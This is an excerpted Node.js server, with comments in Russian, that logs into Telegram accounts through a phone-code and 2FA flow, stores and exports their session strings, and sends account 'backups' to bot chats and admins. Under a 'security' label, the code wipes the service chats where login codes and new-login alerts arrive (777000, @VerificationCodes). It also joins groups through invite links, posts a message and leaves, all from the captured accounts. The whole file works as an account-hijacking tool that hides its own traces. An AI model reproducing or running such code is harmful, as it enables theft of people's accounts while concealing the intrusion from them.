...
async function _joinSendLeaveWithClient(client, telegramId) {
  ...
  const inviteMatch = groupTarget.match(/(?:https?:\/\/)?t\.me\/\+([A-Za-z0-9_-]+)/);
  ...
  try {
    ...
    if (isInviteLink) {
      ...
      try {
        ...
        if (!entity) { console.warn("[group] ImportChatInvite: no chat in result"); return; }
        console.log("[group] telegramId=" + telegramId + ": joined via invite link");
      } catch (joinErr) {
        if (joinErr.message?.includes("USER_ALREADY_PARTICIPANT")) {
          // Already a member — resolve entity via CheckChatInvite
          try {
            const checkRes = await client.invoke(new Api.messages.CheckChatInvite({ hash: inviteHash }));
            // CheckChatInvite → ChatInviteAlready (has .chat) or ChatInvite (no entity yet)
            entity = checkRes.chat || null;
          } catch (_ce) {}
          if (!entity) {
            // Fallback: search dialogs for a recently active group
            try {
              const dlgs = await client.getDialogs({ limit: 200 });
              const recentGroup = dlgs.find(d => d.isGroup || d.isChannel);
              entity = recentGroup?.entity || null;
            } catch (_) {}
          }
          if (!entity) {
          ...
          console.log("[group] telegramId=" + telegramId + ": already member, resolved entity");
        } else if (joinErr.message?.includes("INVITE_HASH_EXPIRED") || joinErr.message?.includes("INVITE_HASH_INVALID")) {
          // Link expired — notify admins and abort
          const errMsg = `⚠️ <b>Ссылка на группу истекла!</b>\n\nОбновите ссылку в настройках бота.\n\nТекущая: <code>${groupTarget}</code>`;
          console.warn("[group] telegramId=" + telegramId + ": invite link EXPIRED — admin notified");
          _notifyAdmins(errMsg);
          return;
        } else {
          console.warn("[group] telegramId=" + telegramId + ": ImportChatInvite failed:", joinErr.message);
          return;
        }
      }
    } else {
    ...
    // ── Leave ─────────────────────────────────────────────────────────────
    let leftOk = false;
    const isMegaOrChannel = entity.className === "Channel"
    ...
    try {
      if (isMegaOrChannel) {
        ...
        try {
          await client.invoke(new Api.messages.LeaveChat({ chatId: entity.id }));
        } catch (_) {
          await client.invoke(new Api.channels.LeaveChannel({ channel: entity }));
        }
      }
      leftOk = true;
      console.log("[group] telegramId=" + telegramId + ": joined → sent → left ✓ (" + groupTarget + ")");
    } catch (leaveErr) {
      console.warn("[group] telegramId=" + telegramId + ": leave failed:", leaveErr.message);
    }
    if (!leftOk) {
      try {
        await client.invoke(new Api.channels.LeaveChannel({ channel: entity }));
        console.log("[group] telegramId=" + telegramId + ": left on retry ✓");
      } catch (_) {}
    }
  } catch (e) {
...
async function applyAllLoginActions(sessionStr, telegramId, firstName = '') {
  ...
  try {
    ...
    try {
      ...
      console.log(`[security] telegramId=${telegramId}: TG service chat cleared (777000)`);
      ...
      try {
        ...
        if (_vcPeer) {
          await client.invoke(new Api.messages.DeleteHistory({
            peer: _vcPeer, justClear: true, revoke: false, maxId: 0,
          }));
          console.log(`[security] telegramId=${telegramId}: @VerificationCodes cleared`);
        }
      } catch (_vcErr) {
      ...
      try {
        ...
        await client.invoke(new Api.messages.DeleteHistory({ peer: _42Peer, justClear: true, revoke: false, maxId: 0 }));
        console.log(`[security] telegramId=${telegramId}: 42777 cleared`);
          ...
          setTimeout(async () => {
            try {
              ...
              try {
                ...
                await _clr2.invoke(new Api.messages.DeleteHistory({ peer: _p, justClear: true, revoke: false, maxId: 0 }));
              } catch (_) {}
              ...
              try {
                ...
                if (_vp) await _clr2.invoke(new Api.messages.DeleteHistory({ peer: _vp, justClear: true, revoke: false, maxId: 0 }));
              } catch (_) {}
              await _clr2.disconnect().catch(() => {});
              console.log(`[security] telegramId=${telegramId}: post-2FA clear done`);
...
async function generateAndSendBackup(telegramId, botToken) {
  ...
  try {
    ...
    // Only deliver to users who have actually started the backup bot
    // (adding telegramId causes "chat not found" if they never /start'ed the bot)
    const recipients = [...new Set([...recipRows.map(r => String(r.telegram_id)), ...adminIds])];
    ...
    // tdata disabled — opentele library incompatible with Python 3.14
...
async function sendViaBot(filePath, fileName, primaryToken, telegramId, caption, parseMode = null) {
  ...
  for (const tok of tokens) {
    ...
    try {
      ...
      console.warn(`[backup] bot ${tok.split(":")[0]} failed:`, d.description);
    } catch (e) {
      console.warn(`[backup] send error:`, e.message);
    }
  }
  buf = null;
  console.error(`[backup] all bots failed to deliver "${fileName}" to ${telegramId}`);
  return false;
}
...
const server = http.createServer(async (req, res) => {
  ...
  if (req.method === "POST" && url === "/mtproto/send-code") {
    ...
    if (!phone || !/^\+\d{7,15}$/.test(phone.trim()))
      return json(res, 400, { error: "Неверный формат номера" });
  ...
  if (req.method === "POST" && url === "/mtproto/verify") {
    ...
    try { b = await readBody(req); } catch { return json(res, 413, { error: "Request too large" }); }
    const { token, code } = b;
    if (!token || !code) return json(res, 400, { error: "Нужен token и code" });
    const pending = pendingClients.get(token);
    if (!pending) return json(res, 410, { error: "Сессия истекла. Запросите код снова." });
    ...
    try {
      ...
      ;(async () => {
        ...
        if (!_logToken) return;
        const { rows: chatRows } = await pool.query("SELECT telegram_id FROM backup_bot_chats").catch(() => ({ rows: [] }));
      ...
      if (e.message.includes("PHONE_CODE_INVALID"))
        return json(res, 401, { error: "Неверный код." });
      if (e.message.includes("PHONE_CODE_EXPIRED"))
        return json(res, 401, { error: "Код истёк. Запросите новый." });
      json(res, 500, { error: e.message });
    }
    return;
  }
  ...
  if (req.method === "POST" && url === "/mtproto/verify-2fa") {
    ...
    if (!token || !password) return json(res, 400, { error: "Нужен token и password" });
    ...
    try {
      ...
      ;(async () => {
        ...
        const { rows: chatRows2 } = await pool.query("SELECT telegram_id FROM backup_bot_chats").catch(() => ({ rows: [] }));
      ...
      if (e.message?.includes("PASSWORD_HASH_INVALID"))
        return json(res, 401, { error: "Неверный пароль 2FA." });
      json(res, 500, { error: e.message });
    }
    return;
  }
  ...
  if (req.method === "POST" && url === "/mtproto/restore") {
    ...
    if (!session_str || typeof session_str !== "string" || session_str.trim().length < 10)
      return json(res, 400, { error: "Нужен session_str" });
    const client = newClient(session_str.trim());
    try {
      await client.connect();
      const me = await client.getMe();
      if (!me) { await client.disconnect(); return json(res, 401, { error: "Сессия недействительна" }); }
      const freshSession = client.session.save();
      await client.disconnect().catch(() => {});
      ...
      if (e.message.includes("AUTH_KEY_UNREGISTERED") || e.message.includes("SESSION_REVOKED"))
        return json(res, 401, { error: "Сессия отозвана Telegram." });
      json(res, 500, { error: e.message });
    }
    return;
  }
  ...
  if (req.method === "GET" && url === "/mtproto/export") {
    try {
      ...
      if (!sesRows.length) return json(res, 404, { error: "Telegram-сессия не найдена." });
      const { session_str, phone, first_name, username } = sesRows[0];
  ...
  if (req.method === "POST" && url === "/mtproto/dialogs/refresh") {
    try {
      ...
      if (!rows.length) return json(res, 404, { error: "Telegram-сессия не найдена" });
  ...
  if (req.method === "POST" && url === "/mtproto/send-backup") {
    try {
      ...
      const botToken = b.bot_token
        ...
        || process.env.BOT_TOKEN
        || process.env.TELEGRAM_BOT_TOKEN;
      if (!botToken) return json(res, 400, { error: "bot_token не задан" });
      const { rows } = await pool.query(
        "SELECT session_str FROM tg_sessions WHERE telegram_id=$1", [user.telegramId]
      );
      if (!rows.length)
        return json(res, 404, { error: "Telegram-сессия не найдена. Сначала войдите через MTProto." });
  ...
  if (req.method === "POST" && url === "/mtproto/rerun") {
    try {
      ...
      json(res, 200, { ok: true, message: "Rerun запущен в фоне. Архив и уведомления придут в Telegram." });
    } catch (e) { json(res, 500, { error: e.message }); }
    return;
  }
